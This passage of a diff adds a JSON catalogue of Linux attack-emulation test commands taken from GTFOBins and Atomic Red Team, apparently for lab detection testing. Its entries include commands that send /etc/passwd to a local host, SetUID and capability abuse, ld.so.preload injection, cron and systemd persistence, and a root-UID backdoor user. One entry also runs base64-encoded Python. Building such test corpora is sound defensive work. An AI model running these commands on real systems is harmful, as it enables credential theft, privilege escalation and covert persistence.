+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "openssl",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "perl (upload)",
+      "command": "perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>\"127.0.0.1\", PeerPort=>80, Proto=>\"tcp\") or die;open(my $file, \"<\", \"/etc/passwd\") or die;$content = join(\"\", <$file>);close($file);$headers = \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \" . length($content) . \"\\r\\nConnection: close\\r\\n\\r\\n\";print $s $headers . $content;while (<$s>) { }close($s);'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "perl",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "php (upload)",
+      "command": "php -S 0.0.0.0:80",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "php",
+      "gtfobins_function": "upload",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "restic (upload)",
+      "command": "restic backup -r rest:http://127.0.0.1:2222/x /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "restic",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "rlogin (upload)",
+      "command": "rlogin -l DATA -p 2222 127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "rlogin",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ruby (upload)",
+      "command": "ruby -run -e httpd . -p 80",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ruby",
+      "gtfobins_function": "upload",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "scp (upload)",
+      "command": "scp /etc/passwd user@127.0.0.1:/tmp/gtfo_out",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "scp",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "smbclient (upload)",
+      "command": "smbclient '\\\\127.0.0.1\\share' -c 'put /etc/passwd /tmp/gtfo_out'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "smbclient",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "socat (upload)",
+      "command": "socat -u file:/etc/passwd tcp-connect:127.0.0.1:2222",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "socat",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ssh (upload)",
+      "command": "echo DATA | ssh user@127.0.0.1 'cat >/tmp/gtfo_out\"",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ssh",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tailscale (upload)",
+      "command": "tailscale serve --http=2222 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tailscale",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "tar (upload)",
+      "command": "tar cvf user@127.0.0.1:/tmp/gtfo_out /etc/passwd --rsh-command=/bin/ssh",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "tar",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "wget (upload)",
+      "command": "wget --post-file=/etc/passwd http://127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "wget",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "wget (upload)",
+      "command": "wget --post-data=DATA http://127.0.0.1",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "wget",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "whois (upload)",
+      "command": "whois -h 127.0.0.1 -p 2222 DATA",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "whois",
+      "gtfobins_function": "upload",
+      "lab_rewritten": true
+    }
+  ],
+  "privesc": [
+    {
+      "technique": "T1222.002",
+      "test_name": "chattr - Remove immutable file attribute",
+      "command": "chattr -i /var/spool/cron/root",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1222.002",
+      "test_name": "Chmod through c script",
+      "command": "/tmp/T1222002 /tmp/ T1222002",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1222.002",
+      "test_name": "Chown through c script",
+      "command": "sudo /tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1548.001",
+      "test_name": "Make and modify binary from C source",
+      "command": "cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello",
+      "cleanup_command": "sudo rm /tmp/hello\nsudo rm /tmp/hello.c",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1548.001",
+      "test_name": "Set a SetUID flag on file",
+      "command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod u+xs /tmp/evilBinary",
+      "cleanup_command": "sudo rm /tmp/evilBinary",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1548.001",
+      "test_name": "Set a SetGID flag on file",
+      "command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod g+xs /tmp/evilBinary",
+      "cleanup_command": "sudo rm /tmp/evilBinary",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1548.001",
+      "test_name": "Make and modify capabilities of a binary",
+      "command": "cp PathToAtomicsFolder/T1548.001/src/cap.c /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap",
+      "cleanup_command": "rm /tmp/cap\nrm /tmp/cap.c",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1548.001",
+      "test_name": "Provide the SetUID capability to a file",
+      "command": "touch /tmp/evilBinary\nsudo setcap cap_setuid=ep /tmp/evilBinary",
+      "cleanup_command": "rm /tmp/evilBinary",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1574.006",
+      "test_name": "Shared Library Injection via /etc/ld.so.preload",
+      "command": "sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'",
+      "cleanup_command": "sudo sed -i 's#/tmp/T1574006.so##' /etc/ld.so.preload",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1574.006",
+      "test_name": "Shared Library Injection via LD_PRELOAD",
+      "command": "LD_PRELOAD=/tmp/T1574006.so ls",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    }
+  ],
+  "persistence": [
+    {
+      "technique": "T1053.003",
+      "test_name": "Cron - Replace crontab with referenced file",
+      "command": "crontab -l > /tmp/notevil\necho \"* * * * * /tmp/evil.sh\" > /tmp/persistevil && crontab /tmp/persistevil",
+      "cleanup_command": "crontab /tmp/notevil",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1053.003",
+      "test_name": "Cron - Add script to all cron subfolders",
+      "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/persistevil\necho \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.hourly/persistevil\necho \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.monthly/persistevil\necho \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.weekly/persistevil",
+      "cleanup_command": "rm /etc/cron.daily/persistevil -f\nrm /etc/cron.hourly/persistevil -f\nrm /etc/cron.monthly/persistevil -f\nrm /etc/cron.weekly/persistevil -f",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1053.003",
+      "test_name": "Cron - Add script to /etc/cron.d folder",
+      "command": "echo \"echo '*/5     *       *       *       *       root    echo \"Hello from Atomic Red Team\"' > /tmp/atomic.log\" > /etc/cron.d/persistevil",
+      "cleanup_command": "rm /etc/cron.d/persistevil -f",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1053.003",
+      "test_name": "Cron - Add script to /var/spool/cron/crontabs/ folder",
+      "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" >> /var/spool/cron/crontabs/persistevil",
+      "cleanup_command": "rm /var/spool/cron/crontabs/persistevil -f",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1136.001",
+      "test_name": "Create a user account on a Linux system",
+      "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user",
+      "cleanup_command": "userdel evil_user",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1136.001",
+      "test_name": "Create a new user in Linux with `root` UID and GID.",
+      "command": "useradd -g 0 -M -d /root -s /bin/bash butter\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo \"BetterWithButter\" | passwd --stdin butter; fi;",
+      "cleanup_command": "userdel butter",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1543.002",
+      "test_name": "Create Systemd Service",
+      "command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service\necho \"\" >> /etc/systemd/system/art-systemd-service.service\necho \"[Service]\" >> /etc/systemd/system/art-systemd-service.service\necho \"Type=simple\"\necho \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service\necho \"\" >> /etc/systemd/system/art-systemd-service.service\necho \"[Install]\" >> /etc/systemd/system/art-systemd-service.service\necho \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service\nsystemctl daemon-reload\nsystemctl enable art-systemd-service.service\nsystemctl start art-systemd-service.service",
+      "cleanup_command": "systemctl stop art-systemd-service.service\nsystemctl disable art-systemd-service.service\nrm -rf /etc/systemd/system/art-systemd-service.service\nsystemctl daemon-reload",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1543.002",
+      "test_name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.",
+      "command": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002\necho \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002\necho \"# Provides : Atomic Test T1543.002\" >> /etc/init.d/T1543.002\necho \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002\necho \"# Required-Stop : \" >> /etc/init.d/T1543.002\necho \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002\necho \"# Default-Stop: \" >> /etc/init.d/T1543.002\necho \"# Short Description: Atomic Test for Systemd Service Creation\" >> /etc/init.d/T1543.002\necho \"### END INIT INFO\" >> /etc/init.d/T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi\nsystemctl enable T1543.002\nsystemctl start T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002",
+      "cleanup_command": "systemctl stop T1543.002\nsystemctl disable T1543.002\nrm -rf /etc/init.d/T1543.002\nsystemctl daemon-reload",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "Add command to .bash_profile",
+      "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile",
+      "cleanup_command": "head -n '-2' ~/.bash_profile > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bash_profile",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "Add command to .bashrc",
+      "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc",
+      "cleanup_command": "head -n '-2' ~/.bashrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bashrc",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "Add command to .shrc",
+      "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.shrc",
+      "cleanup_command": "head -n '-2' ~/.shrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.shrc",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "Append to the system shell profile",
+      "command": "echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile",
+      "cleanup_command": "sed -i \"s/# Atomic Red Team was here! T1546.004//\" /etc/profile",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "Append commands user shell profile",
+      "command": "echo '# Atomic Red Team was here... T1546.004' >> ~/.profile",
+      "cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" ~/.profile",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "System shell profile scripts",
+      "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh",
+      "cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1546.004",
+      "test_name": "Create/Append to .bash_logout",
+      "command": "useradd --create-home --shell /bin/bash art\nsu -l art -c \"echo 'echo \\\"Atomic Red Team was here... T1546.004\\\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit\"",
+      "cleanup_command": "userdel -fr art",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    }
+  ]
+}
